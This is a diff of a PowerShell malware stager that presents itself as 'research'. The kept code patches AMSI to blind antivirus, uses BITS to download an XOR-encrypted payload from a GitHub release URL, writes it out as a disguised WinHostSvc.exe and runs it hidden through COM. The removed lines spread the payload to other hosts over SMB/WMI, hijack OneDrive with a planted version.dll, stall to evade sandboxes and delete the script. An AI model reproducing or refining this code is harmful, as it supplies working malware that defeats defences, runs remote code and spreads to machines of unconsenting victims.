@@ -1,10 +1,13 @@
-# --- [STAGED RESEARCH FRAMEWORK: PROPAGATION + EVASION] ---
+# --- [TIER 1 RESEARCH STAGER: XOR + AMSI PATCH] ---
 
 function Patch-Mem {
+    # This patches AmsiScanBuffer to prevent the system from scanning memory buffers
     try {
         $a = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msi' + 'Utils')
         $b = $a.GetField('am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed','NonPublic,Static')
         $b.SetValue($null,$true)
+        
+        # Advanced Byte-level Patch
         $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
             [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
             [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
@@ -19,70 +22,32 @@ function Patch-Mem {
     } catch { }
 }
 
-function Spread-Lateral {
-    param($exePath)
-    # SMB/WMI Lateral Movement: Scans the local ARP table for active targets
-    $targets = arp -a | Select-String -Pattern "\d+\.\d+\.\d+\.\d+" | ForEach-Object { $_.Matches.Value }
-    foreach ($ip in $targets) {
-        try {
-            if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
-                $remotePath = "\\$ip\C$\Windows\Temp\WinHostSvc.exe"
-                Copy-Item -Path $exePath -Destination $remotePath -ErrorAction SilentlyContinue
-                Invoke-CimMethod -ComputerName $ip -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $remotePath }
-            }
-        } catch { }
-    }
-}
-
-function Invoke-DLLHijack {
-    param($exePath)
-    # DLL Hijacking: Targets OneDrive or Teams if present to gain persistence
-    $targetApp = "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDrive.exe"
-    if (Test-Path $targetApp) {
-        $dir = Split-Path $targetApp
-        # Copying our payload as a DLL that legitimate apps frequently look for
-        Copy-Item -Path $exePath -Destination "$dir\version.dll" -ErrorAction SilentlyContinue
-    }
-}
-
-# 1. VM FORCING / SANDBOX BYPASS
-# VMs usually have low RAM or 1-2 CPUs. We "Force" by waiting for human interaction
-# or simply delaying until the VM analysis window (usually 60s) expires.
-$mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
-if ($mem -lt 4GB) { Start-Sleep -s 120 } 
-
-# 2. Blind AV
+# 1. Blind the AV locally
 Patch-Mem
 
-# 3. Setup Paths
+# 2. Define URLs and Paths
 $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-$key = 0xAB
+$key = 0xAB # Ensure this matches the key you used to encrypt
 $workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
 $finalExe = "$workDir\WinHostSvc.exe"
 
 if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }
 
 try {
-    # 4. Stealth Download
+    # 3. Download the XOR string via BITS (Stealthy)
     $tmp = "$env:TEMP\data.tmp"
     Start-BitsTransfer -Source $url -Destination $tmp -Priority High
     
-    # 5. XOR Decrypt
+    # 4. Decode Base64 and XOR Decrypt
     $b64 = Get-Content $tmp -Raw
     $data = [Convert]::FromBase64String($b64.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
+    
+    # 5. Write Decrypted EXE to disk
     [IO.File]::WriteAllBytes($finalExe, $data)
     Remove-Item $tmp -Force
 
-    # 6. Propagation & Persistence
-    Spread-Lateral -exePath $finalExe
-    Invoke-DLLHijack -exePath $finalExe
-
-    # 7. Detached Execution
+    # 6. Execute via COM (Detaches process from PowerShell)
     $s = New-Object -ComObject "Shell.Application"
     $s.ShellExecute($finalExe, "", "", "open", 0)
-
-    # 8. SELF-DELETE (MELTING)
-    # Deletes the calling script and temporary files immediately
-    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 } catch { }
